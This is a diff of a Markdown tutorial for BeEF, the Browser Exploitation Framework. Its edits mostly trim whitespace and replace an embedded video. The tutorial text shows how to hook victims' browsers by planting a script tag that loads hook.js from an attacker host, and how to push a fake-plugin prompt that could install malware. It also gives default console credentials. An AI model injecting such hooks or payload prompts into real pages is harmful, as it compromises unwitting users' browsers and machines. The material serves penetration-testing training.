@@ -10,7 +10,7 @@ Website
 Description
 -----------
 
-BeEF, The Browser Exploitation Framework Project is a tool for the pwnage of one of the 
+BeEF, The Browser Exploitation Framework Project is a tool for the pwnage of one of the
 underexplored frontiers in information security, the web browser.
 
 Install Location
@@ -21,17 +21,13 @@ Install Location
 Usage
 -----
 
-BeEF uses javascript to "hook" one or more browsers before attempting to leverage its access for 
+BeEF uses javascript to "hook" one or more browsers before attempting to leverage its access for
 further exploitation.
 
 Video Walkthrough
 -----------------
 
-<video controls>
-  <source src="Videos/1_550_BeEF.mp4">
-  <source src="https://onedrive.live.com/download.aspx?cid=8D6C4317A39E3D29&resid=8D6C4317A39E3D29%2155679&canary=">
- <p>Your browser does not support html5 video.</p>
-</video>
+<iframe src="https://onedrive.live.com/embed?cid=8D6C4317A39E3D29&resid=8D6C4317A39E3D29%2155680&authkey=ABFf2c6CSDAMzFQ" width="320" height="180" frameborder="0" scrolling="no" allowfullscreen></iframe>
 
 Example 1: Hooking a Web Browser
 --------------------------------
@@ -65,10 +61,10 @@ Next launch BeEF like so:
         [14:01:14][*] HTTP Proxy: http://127.0.0.1:6789
         [14:01:14][*] BeEF server started (press control+c to stop)
 
-Now that we have BeEF listening for connections let's embed the javascript hook in a page and get 
+Now that we have BeEF listening for connections let's embed the javascript hook in a page and get
 our target to browse to it.
 
-All you need to do to embed the javascript hook on any page is to insert a single line of html 
+All you need to do to embed the javascript hook on any page is to insert a single line of html
 like this:
 
 `<script src='http://192.168.1.109:3000/hook.js'></script>`
@@ -98,7 +94,7 @@ Load up [http://127.0.0.1/beef/hook.php](http://127.0.0.1/beef/hook.php)
 
 You shouldn't see anything more than a default, blank, boring page.
 
-Now open up a new tab and navigate to the BeEF UI.  This can be accomplished by either 
+Now open up a new tab and navigate to the BeEF UI.  This can be accomplished by either
 directly accessing the url [http://127.0.0.1:3000/ui/panel](http://127.0.0.1:3000/ui/panel)
 or by visiting [http://127.0.0.1](http://127.0.0.1) and clicking the link **BeEF (Console)**.
 
@@ -109,7 +105,7 @@ Authenticate:
     Username:    beef
     Password:    beef
 
-After authentication you should be able to see your hooked browser on the left hand side 
+After authentication you should be able to see your hooked browser on the left hand side
 under "Online Browsers"
 
 ![](Beef_files/Image_004.PNG)
@@ -118,7 +114,7 @@ And that's it, you have successfully hooked a web browser.
 
 The browser will remain hooked as long as the tab it has open to your page remains as such.
 
-To see some example of what we can do with a hooked browser, continue on to 
+To see some example of what we can do with a hooked browser, continue on to
 [Example 2: Browser Based Exploitation With BeEF].
 
 Example 2: Browser Based Exploitation With BeEF
@@ -131,7 +127,7 @@ or visiting [http://127.0.0.1](http://127.0.0.1) and clicking the link **BeEF (C
 
 ![](Beef_files/Image_004.PNG)
 
-To get started click on your hooked web browser.  This should bring up details about your selected 
+To get started click on your hooked web browser.  This should bring up details about your selected
 browser in the multi-tabbed menu on the right of the console.
 
 ![](Beef_files/Image_005.PNG)
@@ -157,8 +153,8 @@ After a few seconds, the hooked browser should see something similar to this.
 ![](Beef_files/Image_009.png)
 
 If they install the plugin, they are pwned.
-It should be noted that this method can be used to deliver anything, not just the default 
-"malicious plugin."  This could easily be leverage to install fully fledged malware on the system, 
+It should be noted that this method can be used to deliver anything, not just the default
+"malicious plugin."  This could easily be leverage to install fully fledged malware on the system,
 simply by updating the module options before execution.
 
 There are tons of other modules available in BeEF, don't stop here. Get exploring.
